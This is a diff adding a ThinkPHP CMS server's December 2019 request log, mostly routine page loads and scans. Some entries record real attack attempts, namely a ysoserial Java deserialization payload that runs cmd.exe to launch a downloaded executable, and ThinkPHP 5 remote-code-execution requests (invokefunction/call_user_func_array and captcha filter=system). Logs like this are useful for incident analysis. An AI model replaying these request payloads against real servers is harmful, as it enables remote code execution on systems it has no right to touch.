@@ -1,0 +1,1905 @@
+---------------------------------------------------------------
+[ 2019-12-01T00:13:05+08:00 ] 177.188.126.179 GET 114.115.146.220:80/
+[运行时间：0.024528s] [吞吐率：40.77req/s] [内存消耗：472.16kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001044s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001078s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000853s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000325s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000230s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T00:40:20+08:00 ] 114.5.98.54 GET 114.115.146.220:80/
+[运行时间：0.024174s] [吞吐率：41.37req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001029s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001064s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000841s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000330s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T00:44:46+08:00 ] 185.60.14.33 GET 114.115.146.220:80/
+[运行时间：0.024127s] [吞吐率：41.45req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001035s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001068s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000840s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000328s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T02:16:52+08:00 ] 103.43.5.236 GET 114.115.146.220:80/
+[运行时间：0.025738s] [吞吐率：38.85req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001085s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001121s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000868s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000322s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000231s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T02:17:50+08:00 ] 120.14.8.194 POST 114.115.146.220/invoker/readonly
+[运行时间：0.013287s] [吞吐率：75.26req/s] [内存消耗：336.46kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000762s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000795s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'invoker',
+    1 => 'readonly',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://114.115.146.220:80/invoker/readonly',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'content-length' => '2221',
+  'host' => '114.115.146.220',
+)
+[ info ] [ PARAM ] array (
+  '��' => '',
+  '6݅' => '',
+  'ysoserial_payloads_CommonsCollections5t' => '',
+  'java_util_Collections$UnmodifiableList�%1��' => '',
+  'cmd_exe_/c_C:\\Windows/Temp/download_exet' => '',
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T04:25:26+08:00 ] 178.223.71.124 GET 114.115.146.220:80/
+[运行时间：0.025561s] [吞吐率：39.12req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000066s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001130s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001164s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001119s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000324s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T04:54:48+08:00 ] 54.36.113.62 GET /
+[运行时间：0.027127s] [吞吐率：36.86req/s] [内存消耗：471.55kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001168s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001202s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)',
+  'accept' => '*/*',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000887s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000353s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T05:08:17+08:00 ] 207.180.211.90 GET /
+[运行时间：0.023919s] [吞吐率：41.81req/s] [内存消耗：471.55kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001025s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001058s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)',
+  'accept' => '*/*',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000832s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000322s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/TP/public/index.php
+[运行时间：0.019299s] [吞吐率：51.82req/s] [内存消耗：333.20kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000065s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001035s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001081s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'TP',
+    1 => 'public',
+    2 => 'index.php',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/TP/index.php
+[运行时间：0.012885s] [吞吐率：77.61req/s] [内存消耗：333.13kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000964s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000997s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'TP',
+    1 => 'index.php',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000208s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/thinkphp/html/public/index.php
+[运行时间：0.012948s] [吞吐率：77.23req/s] [内存消耗：333.20kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000944s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000978s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'thinkphp',
+    1 => 'html',
+    2 => 'public',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000212s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/html/public/index.php
+[运行时间：0.013066s] [吞吐率：76.53req/s] [内存消耗：333.20kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000952s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000986s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'html',
+    1 => 'public',
+    2 => 'index.php',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000223s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/public/index.php
+[运行时间：0.012669s] [吞吐率：78.93req/s] [内存消耗：333.16kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000942s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000975s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'public',
+    1 => 'index.php',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/TP/html/public/index.php
+[运行时间：0.012983s] [吞吐率：77.02req/s] [内存消耗：333.16kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000934s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000967s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'TP',
+    1 => 'html',
+    2 => 'public',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/elrekt.php
+[运行时间：0.013646s] [吞吐率：73.28req/s] [内存消耗：333.06kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001025s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001061s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'elrekt.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000213s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/index.php
+[运行时间：0.019182s] [吞吐率：52.13req/s] [内存消耗：472.21kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001011s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001045s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000887s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000317s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000218s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+[运行时间：0.011150s] [吞吐率：89.69req/s] [内存消耗：341.96kb] [文件加载：118]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000702s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000735s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'phpinfo',
+    1 => 
+    array (
+      0 => '1',
+    ),
+  ),
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 POST 114.115.146.220/index.php?s=captcha
+[运行时间：0.010567s] [吞吐率：94.63req/s] [内存消耗：333.96kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000688s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000722s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'captcha',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Go-http-client/1.1',
+  'content-length' => '84',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  'filter' => 
+  array (
+    0 => 'system',
+  ),
+  'method' => 'get',
+  'server' => 
+  array (
+    'REQUEST_METHOD' => 'uname',
+  ),
+  'ipconfig' => '',
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000199s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T05:32:15+08:00 ] 106.12.40.132 GET 114.115.146.220:80/
+[运行时间：0.015905s] [吞吐率：62.87req/s] [内存消耗：472.16kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000702s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000735s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000831s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000304s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000223s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T06:51:39+08:00 ] 202.178.121.30 GET 114.115.146.220/
+[运行时间：0.029607s] [吞吐率：33.78req/s] [内存消耗：472.11kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001086s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001120s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'python-requests/2.22.0',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000877s ]
